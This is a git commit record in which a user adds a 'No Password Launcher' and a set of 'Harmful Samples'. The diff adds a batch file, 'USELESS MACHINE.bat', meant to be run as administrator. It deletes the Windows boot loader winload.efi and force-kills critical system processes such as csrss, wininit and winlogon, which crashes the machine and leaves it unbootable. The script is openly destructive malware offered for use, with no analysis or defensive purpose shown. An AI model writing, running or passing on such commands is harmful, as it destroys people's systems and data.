d34ac67ebb695bff3c24dbf4b281ced351161b1f
BrazenFox5 <80448295+BrazenFox5@users.noreply.github.com>
2021-05-18 17:22:41 -0700

    added files
    Added
    - No Password Launcher (Folder [including zipped], 32-bit application, and 64-bit application
    - Harmful Samples (BSoD, and Unusable Machine [Vista+] on launch)

---
+++ HARMFUL CODE/run as admin/USELESS MACHINE.bat
@@ -0,0 +1,6 @@
+del C:\Windows\System32\winload.efi
+taskkill /f /im wininit.exe /t
+taskkill /f /im winlogon.exe /t
+taskkill /f /im userinit.exe /t
+taskkill /f /im csrss.exe /t
+taskkill /f /im explorer.exe /t
